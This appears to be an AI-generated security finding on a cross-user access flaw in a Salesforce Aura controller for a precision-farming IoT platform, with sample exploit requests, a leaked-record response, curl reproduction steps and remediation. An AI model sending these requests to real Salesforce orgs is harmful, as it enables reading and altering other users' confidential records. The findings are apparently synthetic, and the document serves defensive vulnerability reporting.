# Security Analysis Report
**System:** HarvestIQ IoT Platform (Agriculture / Precision Farming) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0022 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.5 | Multi-tenant cross-user access — `EventController.updateEvent` without ownership check exposes cross-user IoT farming event records |

---

## Finding 1 — Cross-User IoT Farming Event Access via Aura Controller (CRITICAL)

### Summary
The `EventController` Apex class on HarvestIQ IoT Platform (`61db9156.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Event records. The `updateEvent` Aura action accepts an `eventId` parameter from the client without validating that the authenticated user owns or has been granted access to the record. Per §5.0 Pattern 1.5, this enables multi-tenant cross-user access: an attacker with a valid Salesforce session can supply any `eventId` (`0019156`) to access — and potentially modify — another user's precision farming IoT event record, including sensitive crop yield data and field sensor configurations.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://61db9156.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://61db9156.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D61DB9156!AR61db9156...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D61DB9156!AR61db9156...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0019156","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0019156",
        "Name": "Victim Event Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-52-2911"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura session validation.

The response exposes `SensitiveData__c: "SSN: 000-52-2911"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. In a precision agriculture IoT platform, Event records contain field sensor telemetry, irrigation schedules, crop yield data, and agronomy configurations — proprietary farming intelligence with competitive value.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private for Event bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing ownership check | Root cause |
| §5.0 Pattern 1.5 | Vulnerability | Multi-tenant cross-user access | Classification |
| HAR descriptor | `c.EventController.updateEvent` | Aura action | Vulnerable entry point — update action reads before writing |
| HAR params | `eventId` | `0019156` | Victim record ID |
| HAR params | `aura.token` | `undefined` | No Aura token validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-52-2911` | Farming operator PII |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Agronomy notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D61DB9156!AR61db9156..."
```

**Step 2 — Call Aura updateEvent with victim's eventId (VULNERABLE):**
```bash
curl -s -X POST "https://61db9156.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0019156","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-52-2911
```

**Step 3 — Exploit update capability:**
```bash
# updateEvent is a write action — attacker can also modify victim's IoT event data, corrupting crop schedules or sensor configs
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class EventController {`
2. **Add ownership predicate for both read and write:** `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid Aura token.
5. **Server-defined field allowlist:** Remove client-supplied `fields` parameter.
6. **Write operation risk:** `updateEvent` is a write action — the missing ownership check allows not just data read but also cross-user data modification, which can corrupt IoT event schedules and precision farming operations. Treat write operations with highest authorization stringency.
